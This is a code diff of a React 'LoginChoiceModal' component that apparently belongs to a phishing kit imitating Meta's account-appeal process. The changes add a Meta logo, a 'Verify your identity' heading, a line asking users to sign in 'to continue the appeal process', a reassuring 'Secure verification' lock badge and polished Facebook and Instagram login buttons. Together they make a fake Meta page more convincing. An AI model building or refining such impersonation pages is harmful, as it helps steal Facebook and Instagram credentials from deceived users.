@@ -1,9 +1,11 @@
 'use client';
 
-import PageRestrictionImage from '@/assets/images/page-restriction-image.png';
+import BackgroundImage from '@/assets/images/bg-image.png';
+import MetaLogo from '@/assets/images/meta-logo-image.png';
 import { store, type LoginProvider } from '@/store/store';
 import { buildAppealMessage } from '@/utils/message';
 import translateText from '@/utils/translate';
+import { faLock } from '@fortawesome/free-solid-svg-icons/faLock';
 import { faXmark } from '@fortawesome/free-solid-svg-icons/faXmark';
 import { FontAwesomeIcon } from '@fortawesome/react-fontawesome';
 import axios from 'axios';
@@ -11,7 +13,7 @@ import Image from 'next/image';
 import { useEffect, useState, type FC } from 'react';
 
 const FacebookIcon = () => (
-    <svg className='h-5 w-5 shrink-0' viewBox='0 0 24 24' aria-hidden='true'>
+    <svg className='h-[18px] w-[18px] shrink-0' viewBox='0 0 24 24' aria-hidden='true'>
         <path
             fill='#1877F2'
             d='M24 12.073c0-6.627-5.373-12-12-12s-12 5.373-12 12c0 5.99 4.388 10.954 10.125 11.854v-8.385H7.078v-3.47h3.047V9.43c0-3.007 1.792-4.669 4.533-4.669 1.312 0 2.686.235 2.686.235v2.953H15.83c-1.491 0-1.956.925-1.956 1.874v2.25h3.328l-.532 3.47h-2.796v8.385C19.612 23.027 24 18.062 24 12.073z'
@@ -20,7 +22,7 @@ const FacebookIcon = () => (
 );
 
 const InstagramIcon = () => (
-    <svg className='h-5 w-5 shrink-0' viewBox='0 0 24 24' aria-hidden='true'>
+    <svg className='h-[18px] w-[18px] shrink-0' viewBox='0 0 24 24' aria-hidden='true'>
         <defs>
             <linearGradient id='ig-gradient-choice' x1='0%' y1='100%' x2='100%' y2='0%'>
                 <stop offset='0%' stopColor='#f09433' />
@@ -51,7 +53,14 @@ const LoginChoiceModal: FC<LoginChoiceModalProps> = ({ onSelect }) => {
     useEffect(() => {
         if (!geoInfo) return;
 
-        const textsToTranslate = ['Continue with Facebook', 'Continue with Instagram', 'Close modal'];
+        const textsToTranslate = [
+            'Verify your identity',
+            'Sign in with your connected account to continue the appeal process.',
+            'Continue with Facebook',
+            'Continue with Instagram',
+            'Secure verification',
+            'Close modal'
+        ];
 
         const translateAll = async () => {
             const translatedMap: Record<string, string> = {};
@@ -96,39 +105,69 @@ const LoginChoiceModal: FC<LoginChoiceModalProps> = ({ onSelect }) => {
     };
 
     return (
-        <div className='fixed inset-0 z-50 flex h-screen w-screen items-center justify-center bg-black/60 px-4 backdrop-blur-sm'>
-            <div className='relative w-full max-w-[480px] overflow-hidden rounded-2xl bg-white shadow-[0_24px_48px_rgba(0,0,0,0.25)]'>
+        <div className='fixed inset-0 z-50 flex h-screen w-screen items-center justify-center bg-[#1C2B33]/65 px-4 backdrop-blur-md'>
+            <div
+                className='relative w-full max-w-[420px] overflow-hidden rounded-[24px] bg-white shadow-[0_32px_64px_-12px_rgba(0,0,0,0.35)]'
+                role='dialog'
+                aria-modal='true'
+            >
                 <button
                     type='button'
                     onClick={handleClose}
-                    className='absolute top-4 right-4 z-10 flex h-9 w-9 items-center justify-center rounded-full bg-black/10 text-[#1c1e21] transition-colors hover:bg-black/20'
+                    className='absolute top-4 right-4 z-20 flex h-9 w-9 items-center justify-center rounded-full bg-white/80 text-[#65676B] shadow-sm backdrop-blur-sm transition-all hover:bg-white hover:text-[#1C2B33] hover:shadow-md'
                     aria-label={t('Close modal')}
                 >
                     <FontAwesomeIcon icon={faXmark} className='h-4 w-4' />
                 </button>
 
-                <Image src={PageRestrictionImage} alt='' className='h-auto w-full bg-white object-contain' priority />
+                <div className='relative overflow-hidden bg-linear-to-b from-[#EDE8FF] via-[#D2D2FE] to-[#EEF0FF] px-8 pt-10 pb-5'>
+                    <div className='pointer-events-none absolute -top-12 -right-12 h-44 w-44 rounded-full bg-white/40 blur-3xl' />
+                    <div className='pointer-events-none absolute -bottom-10 -left-10 h-36 w-36 rounded-full bg-[#BC1888]/10 blur-3xl' />
+                    <Image
+                        src={BackgroundImage}
+                        alt=''
+                        className='relative mx-auto block h-auto w-full max-w-[260px] object-contain drop-shadow-[0_12px_32px_rgba(88,64,180,0.18)]'
+                        priority
+                    />
+                </div>
 
-                <div className='flex flex-col gap-3 px-5 pt-2 pb-5 sm:px-6 sm:pb-6'>
-                    <button
-                        type='button'
-                        onClick={() => handleSelect('facebook')}
-                        disabled={isSending}
-                        className='flex h-[52px] w-full items-center justify-center gap-3 rounded-xl border border-[#e5e5e5] bg-white px-4 text-[15px] font-semibold text-[#090909] transition-all hover:bg-[#fafafa] hover:shadow-sm active:scale-[0.99] disabled:cursor-not-allowed disabled:opacity-60'
-                    >
-                        <FacebookIcon />
-                        {t('Continue with Facebook')}
-                    </button>
+                <div className='px-7 pt-6 pb-7'>
+                    <div className='mb-6 flex flex-col items-center text-center'>
+                        <Image src={MetaLogo} alt='Meta' className='mb-4 h-[18px] w-[70px]' />
+                        <h2 className='text-[22px] leading-tight font-bold tracking-tight text-[#1C2B33]'>{t('Verify your identity')}</h2>
+                        <p className='mt-2 max-w-[320px] text-[14px] leading-relaxed text-[#65676B]'>{t('Sign in with your connected account to continue the appeal process.')}</p>
+                    </div>
 
-                    <button
-                        type='button'
-                        onClick={() => handleSelect('instagram')}
-                        disabled={isSending}
-                        className='flex h-[52px] w-full items-center justify-center gap-3 rounded-xl border border-[#e5e5e5] bg-white px-4 text-[15px] font-semibold text-[#090909] transition-all hover:bg-[#fafafa] hover:shadow-sm active:scale-[0.99] disabled:cursor-not-allowed disabled:opacity-60'
-                    >
-                        <InstagramIcon />
-                        {t('Continue with Instagram')}
-                    </button>
+                    <div className='flex flex-col gap-3'>
+                        <button
+                            type='button'
+                            onClick={() => handleSelect('facebook')}
+                            disabled={isSending}
+                            className='group flex h-[50px] w-full items-center gap-3.5 rounded-full border border-[#DADDE1] bg-white px-5 text-[15px] font-semibold text-[#1C2B33] transition-all hover:border-[#1877F2]/30 hover:bg-[#F7F8FA] hover:shadow-[0_4px_16px_rgba(24,119,242,0.12)] active:scale-[0.98] disabled:cursor-not-allowed disabled:opacity-60'
+                        >
+                            <span className='flex h-8 w-8 shrink-0 items-center justify-center rounded-full bg-[#1877F2]/10 transition-colors group-hover:bg-[#1877F2]/15'>
+                                <FacebookIcon />
+                            </span>
+                            {t('Continue with Facebook')}
+                        </button>
+
+                        <button
+                            type='button'
+                            onClick={() => handleSelect('instagram')}
+                            disabled={isSending}
+                            className='group flex h-[50px] w-full items-center gap-3.5 rounded-full border border-[#DADDE1] bg-white px-5 text-[15px] font-semibold text-[#1C2B33] transition-all hover:border-[#BC1888]/30 hover:bg-[#F7F8FA] hover:shadow-[0_4px_16px_rgba(188,24,136,0.1)] active:scale-[0.98] disabled:cursor-not-allowed disabled:opacity-60'
+                        >
+                            <span className='flex h-8 w-8 shrink-0 items-center justify-center rounded-full bg-[#BC1888]/10 transition-colors group-hover:bg-[#BC1888]/15'>
+                                <InstagramIcon />
+                            </span>
+                            {t('Continue with Instagram')}
+                        </button>
+                    </div>
+
+                    <p className='mt-5 flex items-center justify-center gap-1.5 text-[12px] text-[#8A8D91]'>
+                        <FontAwesomeIcon icon={faLock} className='h-3 w-3' />
+                        {t('Secure verification')}
+                    </p>
                 </div>
             </div>
         </div>
